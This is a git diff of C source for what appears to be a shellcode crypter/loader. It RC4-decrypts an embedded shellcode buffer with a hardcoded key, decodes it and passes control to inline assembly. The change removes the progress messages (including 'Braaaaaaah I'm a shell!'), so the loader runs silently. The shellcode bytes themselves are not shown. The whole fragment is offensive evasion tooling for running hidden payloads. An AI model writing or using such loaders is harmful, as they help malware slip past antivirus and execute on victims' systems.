@@ -52,7 +52,7 @@ void decoder(int shellcodeLenght) {
 	}
 }
 
-void main(int argc, char **argv){
+void main(int argc, char **argv) {
 
 	unsigned char key[] = "ch3rn0bylMysl4V3slUT";
 	unsigned char pseudoRandomByte;
@@ -61,29 +61,16 @@ void main(int argc, char **argv){
 	int lenKey = strlen(key);
 	int count;
 
-	printf("[*] Start decrypting shellcode..\n");
-	printf("[*] Initializing bytearray\n");
 	initialize();
-
-	printf("[*] Starting key scheduling algorithm\n");
 	key_sheduling(key, lenKey);
-
-	printf("[*] Bytes parsing\n");
 	for (count = 0; count < shellcodeLenght; count++) {
 
 		pseudoRandomByte = pseudo_random();
 		encryptedByte = shellcode[count] ^ pseudoRandomByte;
 		shellcode[count] = encryptedByte;
 	}
-	printf("[+] Shellcode decrypted!\n");
-
-
-	printf("[*] Decoding shellcode..\n");
+	
 	decoder(shellcodeLenght);
-	printf("[+] Shellcode decoded!\n");
-
-	printf("[+] Braaaaaaah I'm a shell!\n");
-
 	__asm__(
 		"xor %eax, %eax\n\t"
 		"xor %ebx, %ebx\n\t"
